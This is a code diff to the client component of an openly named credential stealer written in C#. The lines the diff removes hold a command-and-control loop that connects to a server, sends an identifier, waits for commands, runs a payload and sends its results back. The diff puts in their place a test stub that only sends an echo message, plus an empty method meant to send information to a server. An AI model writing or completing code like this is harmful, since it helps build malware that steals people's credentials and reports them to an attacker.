@@ -10,13 +10,11 @@ namespace CredentialStealer.Client.Console
 {
     public class Client
     {
-        private const int PORT = 80;
+        private const int PORT = 5000;
         private const string IP = "127.0.0.1";
         private const string EOF = "<EOF>";
-
         private const int RETRY_DELAY = 5000;
-        public static string ID = "azerty";
-
+        
         public static byte[] read(NetworkStream clientStream, Encoding encoder)
         {
             byte[] result = new byte[0];
@@ -58,43 +56,43 @@ namespace CredentialStealer.Client.Console
             clientStream.Flush();
         }
 
+        public void SendInfosToMyServer(string content,IPEndPoint serverEndPoint)
+        {
+                TcpClient client = new TcpClient();
+                client.Connect(serverEndPoint);
+                NetworkStream nwStream = client.GetStream();
+                ASCIIEncoding encoder = new ASCIIEncoding();
+
+
+                string textToSend = "echo";
+                byte[] bytesToSend = ASCIIEncoding.ASCII.GetBytes(textToSend);
+
+                //---send the text---
+                System.Console.WriteLine("Sending : " + textToSend);
+                //nwStream.Write(bytesToSend, 0, bytesToSend.Length);
+
+                Client.write(nwStream, encoder, encoder.GetBytes("Echo"));
+                System.Console.WriteLine(encoder.GetString(read(nwStream, encoder)));
+                client.Close(); 
+        }
+
+        public void SendInfosToServer(string content,IPEndPoint serverEndPoint)
+        {
+
+        }
+
         public Client()
         {
             IPEndPoint serverEndPoint = new IPEndPoint(IPAddress.Parse(IP), PORT);
             try
             {
+                
 
-                TcpClient client = new TcpClient();
-                client.Connect(serverEndPoint);
-                NetworkStream clientStream = client.GetStream();
-                ASCIIEncoding encoder = new ASCIIEncoding();
-                Communication.writeString(clientStream, encoder, ID);
-                while (true)
-                {
-                    string command = Communication.readString(clientStream, encoder);
-                    if (command == CredentialStealer.Entities.CommandEnum.Exit.ToString())
-                    {
-                        Communication.writeString(clientStream, encoder, command);
-                        break;
-                    }
-                    PayLoad payload = new PayLoad();
-                    PayLoadResult result = payload.Start();
-                    if (result.ResultCode == PayLoadResultEnum.Failed)
-                    {
-                        Communication.writeString(clientStream, encoder, result.Exception.Message);
-                    }
-                    else if (result.ResultCode == PayLoadResultEnum.Success)
-                    {
-                        Communication.write(clientStream, encoder, encoder.GetBytes(result.content));
-                    }
-                }
-                client.Close();
             }
             catch (Exception ex)
             {
                 throw ex;
             }
-            Thread.Sleep(RETRY_DELAY);
         }
 
         public static void Main(string[] args)
